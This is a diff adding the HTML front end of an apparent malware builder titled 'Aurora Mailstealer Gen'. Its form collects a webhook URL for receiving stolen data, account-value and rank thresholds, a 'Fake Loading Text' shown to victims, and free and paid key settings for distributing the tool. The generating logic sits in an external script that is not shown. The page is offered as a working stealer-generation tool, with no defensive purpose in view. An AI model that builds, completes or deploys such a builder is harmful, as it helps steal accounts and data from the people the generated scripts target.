@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aurora On Top</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+<style>
+  body { font-family: Montserrat, Black; background-color: #f4f4f4; text-align: center; padding: 50px; }
+  .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
+  .input-field, .checkbox-group, button { margin: 10px 0; }
+  button { padding: 10px 20px; background-color: #000000; color: white; border: none; border-radius: 5px; cursor: pointer; }
+  button:hover { background-color: #000000; }
+  #output { text-align: left; white-space: pre-wrap; }
+  textarea { width: 100%; height: 150px; }
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Aurora Mailstealer Gen</h1>
+  <div class="input-field">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username">
+  </div>
+  <div class="input-field">
+    <label for="username2">Username2:</label>
+    <input type="text" id="username2" name="username2">
+  </div>
+  <div class="input-field">
+    <label for="webhook">Webhook URL:</label>
+    <input type="text" id="webhook" name="webhook">
+  </div>
+  <div class="input-field">
+    <label for="min_rap">Minimum Rap:</label>
+    <input type="text" id="min_rap" name="min_rap">
+  </div>
+  <div class="checkbox-group">
+    <input type="checkbox" id="checkrank" name="checkrank">
+    <label for="checkrank">checkrank</label>
+  </div>
+  <div class="input-field">
+    <label for="minimumRank">Minimum Rank:</label>
+    <input type="text" id="minimumRank" name="minimumRank">
+  </div>
+  <div class="checkbox-group">
+    <input type="checkbox" id="keySystemEnabled" name="keySystemEnabled">
+    <label for="keySystemEnabled">keySystemEnabled</label>
+  </div>
+  <div class="input-field">
+    <label for="Title">Key System Title:</label>
+    <input type="text" id="Title" name="Title">
+  </div>
+  <div class="input-field">
+    <label for="Fake_Loading_Text">Fake Loading Text:</label>
+    <input type="text" id="Fake_Loading_Text" name="Fake_Loading_Text">
+  </div>
+  <div class="input-field">
+    <label for="Get_Key_Text">Get Key Text:</label>
+    <input type="text" id="Get_Key_Text" name="Get_Key_Text">
+  </div>
+  <div class="input-field">
+    <label for="keysFree">Free Keys:</label>
+    <input type="text" id="keysFree" name="keysFree">
+  </div>
+  <div class="input-field">
+    <label for="keysPaid">Paid Keys:</label>
+    <input type="text" id="keysPaid" name="keysPaid">
+  </div>
+  <button onclick="generateOutput()">Generate</button>
+  <textarea id="output"></textarea>
+  <button onclick="copyToClipboard()">Copy to Clipboard</button>
+</div>
+
+<script src="./js.js"></script>
+
+</body>
+</html>
